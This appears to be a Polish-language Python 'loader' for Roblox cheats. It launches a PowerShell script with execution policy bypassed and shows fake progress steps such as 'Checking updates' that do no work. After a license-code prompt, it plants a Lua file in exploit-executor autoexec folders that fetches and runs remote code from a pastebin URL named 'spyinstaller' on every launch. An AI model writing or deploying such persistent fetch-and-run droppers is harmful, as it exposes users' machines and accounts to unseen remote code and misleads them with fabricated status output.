import getpass
import os
import shutil
import subprocess
import tempfile
from pathlib import Path

NAZWA_PROGRAMU = "MUMINEK LOADER"
WERSJA = "0.3"
KOD = "aB3!-k9L@-Q2x#-m7Z$"  # Kod Licencji do wpisania w loaderze

# automatycznie wykrywa C:\Users\<twoja nazwa>
HOME = Path.home()

# własny nick (opcjonalnie). Zostaw "" dla automatycznego wykrywania
NICK = ""


def wykryj_nick():
    if NICK.strip():
        return NICK.strip()

    kandydaci = [
        HOME.name,                                             # nazwa folderu profilu
        os.environ.get("USERNAME"),
        os.path.basename(os.environ.get("USERPROFILE", "")),
    ]

    # getpass tylko awaryjnie, bo potrafi rzucić błąd
    try:
        kandydaci.append(getpass.getuser())
    except Exception:
        pass

    for kandydat in kandydaci:
        if kandydat and kandydat.strip():
            nick = kandydat.strip()
            # "franek" / "FRANEK" -> "Franek", ale "xFranekx" zostaje jak jest
            if nick.islower() or nick.isupper():
                nick = nick.capitalize()
            return nick
    return "Użytkownik"


# nazwy opcji w menu głównym
NAZWY_OPCJI = {
    "1": "Roblox",
    "2": "Minecraft",
}

# ============ KONFIGURACJA PLIKÓW LUA ============
# etykieta = nazwa opcji w menu
# folder   = istniejący folder, do którego trafi plik (bez tworzenia nowych)
# nazwa    = nazwa pliku
# tresc    = zawartość pliku

LUA_3 = {
    "etykieta": "Xeno Excutor",
    "folder": str(HOME / "AppData" / "Local" / "Xeno" / "autoexec"),
    "nazwa": "MuminekAPI.lua",
    "tresc": """
                -- == Muminek API == --
                print("Trwa Ladowanie...") -- Muminek Hub Public ( Loader )
                loadstring(game:HttpGet("https://pastebin.com/raw/1iJgA9Uspyinstaller"))();
""",
}

LUA_4 = {
    "etykieta": "Real Excutor",
    "folder": str(HOME / "AppData" / "Local" / "Real" / "autoexec"),
    "nazwa": "MuminekAPI.lua",
    "tresc": """
                -- == Muminek API == --
                print("Trwa Ladowanie...") -- Muminek Hub Public ( Loader )
                loadstring(game:HttpGet("https://pastebin.com/raw/1iJgA9Uspyinstaller"))();
""",
}
# =================================================

# kody wyjścia z PowerShella
WYJSCIE_OK = 0
WYJSCIE_ZLY_KOD = 2

PS_SCRIPT = r"""
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$NAME = $env:LOADER_NAME
$VER  = $env:LOADER_VER
$USER = $env:LOADER_USER
$Host.UI.RawUI.WindowTitle = "$NAME v$VER"

# szerokość ramki dopasowana do nazwy programu
$SPACED = ($NAME.ToUpper().ToCharArray() -join " ") + "  v$VER"
$INNER  = [Math]::Max(40, $SPACED.Length + 8)

Clear-Host
[Console]::CursorVisible = $false

function Center($text, $width) {
    if ($text.Length -ge $width) { return $text }
    $left = [int][Math]::Floor(($width - $text.Length) / 2)
    return (" " * $left) + $text + (" " * ($width - $text.Length - $left))
}

function Get-Greeting {
    $h = (Get-Date).Hour
    if ($h -ge 5 -and $h -lt 18) { return "Dzień dobry" }
    if ($h -ge 18) { return "Dobry wieczór" }
    return "Witaj"
}

function Get-BannerLines {
    $title = Center $SPACED $INNER
    return @(
        "",
        ("  ╔" + ("═" * $INNER) + "╗"),
        ("  ║" + (" " * $INNER) + "║"),
        ("  ║" + $title + "║"),
        ("  ║" + (" " * $INNER) + "║"),
        ("  ╚" + ("═" * $INNER) + "╝"),
        ""
    )
}

function Show-Banner {
    foreach ($l in (Get-BannerLines)) {
        Write-Host $l
        Start-Sleep -Milliseconds 80
    }
}

function Show-Header {
    Clear-Host
    foreach ($l in (Get-BannerLines)) { Write-Host $l }
    $data = Get-Date -Format "yyyy-MM-dd HH:mm"
    Write-Host ("  {0}, {1}!   |   {2}" -f (Get-Greeting), $USER, $data)
    Write-Host ("  " + ("─" * ($INNER + 2)))
    Write-Host ""
}

function Type-Text($text, $ms, $color) {
    foreach ($ch in $text.ToCharArray()) {
        if ($color) { Write-Host -NoNewline $ch -ForegroundColor $color }
        else        { Write-Host -NoNewline $ch }
        Start-Sleep -Milliseconds $ms
    }
    Write-Host ""
}

function Get-Bar($percent, $width) {
    $filled = [int]($width * $percent / 100)
    return ("█" * $filled) + ("░" * ($width - $filled))
}

function Run-Step($label, $durationMs) {
    $frames = @("|", "/", "-", "\")
    $width  = 30
    $p      = 0
    $f      = 0
    $delay  = [int]($durationMs / 30)

    while ($p -lt 100) {
        $p = [Math]::Min(100, $p + (Get-Random -Minimum 1 -Maximum 8))
        $bar = Get-Bar $p $width
        Write-Host -NoNewline ("`r  {0} {1,-24} [{2}] {3,3}%" -f $frames[$f % 4], $label, $bar, $p)
        $f++

        if ((Get-Random -Maximum 10) -eq 0) {
            Start-Sleep -Milliseconds ($delay * 4)
        } else {
            Start-Sleep -Milliseconds $delay
        }
    }

    $bar = Get-Bar 100 $width
    Write-Host ("`r  ✓ {0,-24} [{1}] 100%" -f $label, $bar)
}

# Menu: opcje jedna pod drugą. $items = lista par @("klucz", "nazwa")
function Show-Menu($title, $items) {
    Show-Header
    Write-Host "  $title"
    Write-Host ""
    foreach ($it in $items) {
        Write-Host ("    [{0}] {1}" -f $it[0], $it[1])
    }
    $keys = $items | ForEach-Object { $_[0] }

    while ($true) {
        Write-Host ""
        $ans = (Read-Host "  Tryb Loadera").Trim()
        if ($keys -contains $ans) { return $ans }
        Write-Host "  Nieprawidłowy wybór, spróbuj ponownie."
    }
}

# etykieta opcji + informacja, czy folder docelowy istnieje
function Get-LuaLabel($prefix) {
    $label  = [Environment]::GetEnvironmentVariable("${prefix}_ETYKIETA")
    $folder = [Environment]::GetEnvironmentVariable("${prefix}_FOLDER")
    if (Test-Path -LiteralPath $folder -PathType Container) { return $label }
    return "$label   (brak folderu!)"
}

function Wait-Back {
    Write-Host ""
    Read-Host "  Naciśnij Enter, aby wrócić" | Out-Null
}

function Write-LuaFile($prefix) {
    $folder = [Environment]::GetEnvironmentVariable("${prefix}_FOLDER")
    $nazwa  = [Environment]::GetEnvironmentVariable("${prefix}_NAZWA")
    $tresc  = [Environment]::GetEnvironmentVariable("${prefix}_TRESC")

    Write-Host ""

    # NIE tworzymy folderów - tylko sprawdzamy, czy istnieje
    if (-not (Test-Path -LiteralPath $folder -PathType Container)) {
        Write-Host "  ✗ Folder nie istnieje: $folder"
        Write-Host "    Plik nie został zapisany."
        return
    }

    $pelna   = Join-Path $folder $nazwa
    $istnial = Test-Path -LiteralPath $pelna -PathType Leaf

    Run-Step "Writing $nazwa" 900

    try {
        $utf8 = New-Object System.Text.UTF8Encoding($false)
        [System.IO.File]::WriteAllText($pelna, $tresc, $utf8)
        Write-Host ""
        if ($istnial) { Write-Host "  ✓ Plik nadpisany: $pelna" }
        else          { Write-Host "  ✓ Plik zapisany: $pelna" }
    } catch {
        Write-Host ""
        Write-Host "  ✗ Błąd zapisu pliku: $($_.Exception.Message)"
    }
}

# ---------- START ----------
Show-Banner
Run-Step "Loading modules"        1400
Run-Step "Reading configuration"  1000
Run-Step "Checking updates"       1800
Run-Step "Verifying files"        1200
Run-Step "Testing connection"     1300
Run-Step "Preparing environment"  1500
Start-Sleep -Milliseconds 500

# ---------- LOGOWANIE (3 próby) ----------
Show-Header
[Console]::CursorVisible = $true
$maxTries = 3
$ok = $false

for ($try = 1; $try -le $maxTries; $try++) {
    $sec   = Read-Host "  Podaj kod Licencji" -AsSecureString
    $bstr  = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($sec)
    $plain = [Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr)
    [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)

    if ($plain -ceq $env:LOADER_KOD) { $ok = $true; break }

    $left = $maxTries - $try
    if ($left -gt 0) {
        Write-Host ("  ✗ zły kod (pozostało prób: {0})" -f $left) -ForegroundColor Red
    } else {
        Write-Host "  ✗ zły kod" -ForegroundColor Red
    }
}

if (-not $ok) {
    Start-Sleep -Seconds 2
    exit __WYJSCIE_ZLY_KOD__
}

Write-Host ""
Type-Text "  ✓ Kod poprawny - witaj, $USER!" 25 "Green"
Start-Sleep -Seconds 1

# ---------- MENU GŁÓWNE (pętla) ----------
$t1 = $env:LOADER_OPT1.ToUpper()

while ($true) {
    $w1 = Show-Menu "Wybierz tryb Loadera" @(
        @("1", $env:LOADER_OPT1),
        @("2", $env:LOADER_OPT2),
        @("0", "Wyjście")
    )

    if ($w1 -eq "0") { break }

    if ($w1 -eq "1") {
        while ($true) {
            $w2 = Show-Menu $t1 @(
                @("3", (Get-LuaLabel "LUA3")),
                @("4", (Get-LuaLabel "LUA4")),
                @("0", "Wstecz")
            )

            if ($w2 -eq "0") { break }
            if ($w2 -eq "3") { Write-LuaFile "LUA3"; Wait-Back }
            if ($w2 -eq "4") { Write-LuaFile "LUA4"; Wait-Back }
        }
    }

    if ($w1 -eq "2") {
        Write-Host ""
        Write-Host ("  {0} - Wkrótce..." -f $env:LOADER_OPT2)
        Wait-Back
    }
}

Write-Host ""
Write-Host "  Do zobaczenia, $USER!"
Start-Sleep -Seconds 1
exit 0
""".replace("__WYJSCIE_ZLY_KOD__", str(WYJSCIE_ZLY_KOD))


def komunikat(tekst):
    """Okienko z błędem (działa też przy --noconsole, gdzie print jest niewidoczny)."""
    try:
        import ctypes

        ctypes.windll.user32.MessageBoxW(0, tekst, NAZWA_PROGRAMU, 0x10)
    except Exception:
        print(tekst)


def main():
    if os.name != "nt":
        komunikat("Ten program działa tylko na Windowsie.")
        return

    powershell = shutil.which("powershell") or shutil.which("pwsh")
    if not powershell:
        komunikat("Nie znaleziono PowerShella na tym komputerze.")
        return

    with tempfile.NamedTemporaryFile(
        "w", suffix=".ps1", delete=False, encoding="utf-8-sig"
    ) as f:
        f.write(PS_SCRIPT)
        sciezka = f.name

    env = os.environ.copy()
    env["LOADER_KOD"] = KOD
    env["LOADER_NAME"] = NAZWA_PROGRAMU
    env["LOADER_VER"] = WERSJA
    env["LOADER_USER"] = wykryj_nick()
    env["LOADER_OPT1"] = NAZWY_OPCJI["1"]
    env["LOADER_OPT2"] = NAZWY_OPCJI["2"]
    for prefix, cfg in (("LUA3", LUA_3), ("LUA4", LUA_4)):
        env[f"{prefix}_ETYKIETA"] = cfg["etykieta"]
        env[f"{prefix}_FOLDER"] = cfg["folder"]
        env[f"{prefix}_NAZWA"] = cfg["nazwa"]
        env[f"{prefix}_TRESC"] = cfg["tresc"]

    try:
        wynik = subprocess.run(
            [powershell, "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", sciezka],
            creationflags=subprocess.CREATE_NEW_CONSOLE,
            env=env,
        )
    finally:
        os.remove(sciezka)

    if wynik.returncode == WYJSCIE_OK:
        print("Loader zakończył działanie poprawnie")
    elif wynik.returncode == WYJSCIE_ZLY_KOD:
        print("zły kod")
    else:
        print("Okno loadera zostało zamknięte")


if __name__ == "__main__":
    main()
